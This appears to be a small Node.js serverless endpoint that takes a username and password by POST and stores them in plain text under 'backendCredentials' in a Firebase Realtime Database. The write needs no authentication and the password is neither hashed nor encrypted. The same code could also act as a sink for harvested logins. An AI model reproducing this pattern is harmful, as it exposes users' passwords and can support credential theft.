const admin = require('firebase-admin');

if (!admin.apps.length) {
    const serviceAccountBase64 = process.env.FIREBASE_SERVICE_ACCOUNT;
    const serviceAccountBuffer = Buffer.from(serviceAccountBase64, 'base64');
    const serviceAccount = JSON.parse(serviceAccountBuffer.toString('utf-8'));

    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: 'https://passwordapp-d817c-default-rtdb.firebaseio.com'
    });
}

const db = admin.database();

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { transactionId, username, password } = req.body;

    if (!transactionId || !username || !password) {
        return res.status(400).json({ status: 'error', message: 'Missing fields' });
    }

    try {
        await db.ref('backendCredentials/' + transactionId).set({ username, password });
        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
};
